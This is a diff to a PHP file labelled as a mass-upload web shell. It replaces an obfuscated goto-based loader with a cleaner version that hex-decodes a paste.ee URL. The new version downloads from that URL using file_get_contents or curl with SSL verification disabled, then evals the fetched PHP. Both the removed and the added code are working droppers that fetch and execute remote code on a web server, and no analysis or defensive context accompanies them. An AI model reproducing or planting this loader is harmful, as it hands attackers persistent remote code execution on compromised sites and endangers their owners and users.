@@ -1,4 +1,33 @@
 <?php
 #* Kitabisacom1337
 #* Mass Upload Shell With .htaccess + Delete File
-goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x2e\x65\x65\x2f\x72\x2f\x53\x30\x58\x50\x6a\x2f\x30")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
+$kitabisacom1337 = '68747470733a2f2f70617374652e65652f722f533058506a2f30';
+
+function inyourarea($hex) {
+    return pack('H*', $hex);
+}
+
+$url = inyourarea($kitabisacom1337);
+
+function download($url) {
+    if (ini_get('allow_url_fopen')) {
+        return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    } else {
+        return false;
+    }
+}
+
+$phpScript = download($url);
+if ($phpScript === false) {
+    die("Gagal mendownload script PHP dari URL.");
+}
+
+eval('?>' . $phpScript);
+?>
